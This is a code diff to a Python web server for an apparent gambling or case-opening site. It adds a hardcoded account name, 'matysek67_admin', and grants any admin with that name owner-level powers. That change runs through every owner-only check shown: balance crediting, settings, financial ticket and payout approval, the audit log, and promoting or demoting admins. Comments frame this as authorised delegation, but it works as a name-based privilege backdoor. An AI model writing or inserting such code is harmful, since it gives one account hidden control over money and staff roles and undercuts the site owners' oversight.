@@ -26,6 +26,17 @@ USE_POSTGRES = bool(os.getenv('DATABASE_URL'))
 if USE_POSTGRES and psycopg is None:
     raise RuntimeError('PostgreSQL configured but psycopg is not installed')
 MAX_BET = 3_000_000_000
+# Exactly one authenticated admin account has delegated owner-level staff permissions.
+# An ordinary player using this nickname does not gain privileged access.
+DELEGATED_STAFF_USERNAME = "matysek67_admin"
+
+def staff_owner_access(user):
+    return bool(user and (
+        user["role"] == "owner" or
+        (user["role"] == "admin" and
+         str(user["username"]).casefold() == DELEGATED_STAFF_USERNAME.casefold())
+    ))
+
 
 def now():
     return datetime.now(timezone.utc)
@@ -520,7 +531,11 @@ class Handler(BaseHTTPRequestHandler):
                 JOIN users u ON u.id=s.user_id
                 WHERE s.token_hash=? AND s.expires>? AND u.suspended=0
             """, (hashlib.sha256(token.encode()).hexdigest(), now().isoformat())).fetchone()
-        return dict(row) if row else None
+        if not row:
+            return None
+        identity = dict(row)
+        identity["can_manage_staff"] = staff_owner_access(identity)
+        return identity
 
     def cookie(self, token):
         cookie = "session=" + token + "; Path=/; HttpOnly; SameSite=Lax; Max-Age=31536000"
@@ -779,7 +794,7 @@ class Handler(BaseHTTPRequestHandler):
                                    WHERE n.user_id=? ORDER BY n.id DESC LIMIT 30""",(target,)).fetchall()
             return self.send_json(200, {"notes":[dict(x) for x in rows]})
         if path == "/api/staff/audit":
-            if user["role"] != "owner":
+            if not staff_owner_access(user):
                 return self.fail(403, "Owner only")
             with db_open() as db:
                 rows=db.execute("""SELECT a.id,a.action,a.target_id,a.details,a.created,
@@ -1003,7 +1018,7 @@ class Handler(BaseHTTPRequestHandler):
                     "/api/staff/setting","/api/staff/case-price"):
             if user["role"] not in ("admin","owner"):
                 return self.fail(403, "Staff only")
-            owner=user["role"]=="owner"
+            owner=staff_owner_access(user)
             if path in ("/api/staff/credit","/api/staff/setting","/api/staff/case-price") and not owner:
                 return self.fail(403, "Owner only")
             with LOCK, db_open() as db:
@@ -1161,7 +1176,7 @@ class Handler(BaseHTTPRequestHandler):
                 if not ticket or ticket["status"] != "open":
                     return self.fail(409, "Ticket already handled")
                 # Financial approvals, refunds and manual payout confirmation are owner-only.
-                if ticket["kind"] != "support" and user["role"] != "owner":
+                if ticket["kind"] != "support" and not staff_owner_access(user):
                     return self.fail(403, "Only owner can review financial tickets")
                 if ticket["kind"] == "withdraw":
                     attempt = db.execute("SELECT status,created FROM withdraw_attempts WHERE ticket_id=?", (tid,)).fetchone()
@@ -1227,7 +1242,7 @@ class Handler(BaseHTTPRequestHandler):
                 db.execute("INSERT INTO admin_chat(user_id,message) VALUES(?,?)", (user["id"], message))
             return self.send_json(200, {"ok": True})
         if path == "/api/ranks/remove-admin":
-            if user["role"] != "owner":
+            if not staff_owner_access(user):
                 return self.fail(403, "Owner only")
             username = str(data.get("username", "")).strip()
             with LOCK, db_open() as db:
@@ -1242,7 +1257,7 @@ class Handler(BaseHTTPRequestHandler):
                 staff_audit(db,user["id"],"role.demote",target["id"],{"role":"player"})
             return self.send_json(200, {"ok": True, "username": target["username"]})
         if path == "/api/ranks/add-admin":
-            if user["role"] != "owner":
+            if not staff_owner_access(user):
                 return self.fail(403, "Owner only")
             username = str(data.get("username", "")).strip()
             if not username or len(username) > 32:
@@ -1259,7 +1274,7 @@ class Handler(BaseHTTPRequestHandler):
                 staff_audit(db,user["id"],"role.promote",target["id"],{"role":"admin"})
             return self.send_json(200, {"ok": True, "username": target["username"], "role": "admin"})
         if path == "/api/role":
-            if user["role"] != "owner":
+            if not staff_owner_access(user):
                 return self.fail(403, "Only owner can change roles")
             uid, role = data.get("id"), data.get("role")
             if type(uid) is not int or uid == user["id"] or role not in ("admin", "player"):
